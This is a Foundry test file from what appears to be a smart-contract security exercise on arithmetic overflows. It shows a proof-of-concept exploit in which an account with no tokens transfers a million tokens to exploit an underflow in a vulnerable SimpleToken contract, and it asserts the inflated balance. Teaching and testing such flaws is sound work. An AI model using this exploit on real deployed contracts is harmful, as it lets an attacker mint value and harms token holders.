// SPDX-License-Identifier: MIT

pragma solidity ^0.7.0;
pragma abicoder v2;

import {Test, console} from "forge-std/Test.sol";
import {SimpleToken} from "../../src/4. Arithmetic Overflows-2/SimpleToken.sol";

contract TestSimpleToken is Test {
    SimpleToken token;

    uint256 constant DEPLOYER_MINT_TOKENS = 100000;
    uint256 constant ATTACKER_MINT_TOKENS = 10;

    address deployer = makeAddr("deployer");
    address attacker1 = makeAddr("attacker");

    function setUp() public {}

    function testAttack() public {
        vm.startPrank(deployer);
        // Deploy
        token = new SimpleToken();
        token.mint(deployer, DEPLOYER_MINT_TOKENS);
        token.mint(attacker1, ATTACKER_MINT_TOKENS);
        vm.stopPrank();

        // Get a new account with 0 tokens
        address attacker2 = makeAddr("attacker2");

        console.log("Attacker1 Balance: ", token.getBalance(attacker1));
        console.log("Attacker2 Balance: ", token.getBalance(attacker2));

        vm.startPrank(attacker2);
        token.transfer(attacker1, 1000000);
        vm.stopPrank();

        console.log("Attacker1 Balance: ", token.getBalance(attacker1));
        console.log("Attacker2 Balance: ", token.getBalance(attacker2));

        // Attacker should have a lot of tokens (at least more than 1 million)
        assertGt(token.getBalance(attacker1), 1000000);
    }
}
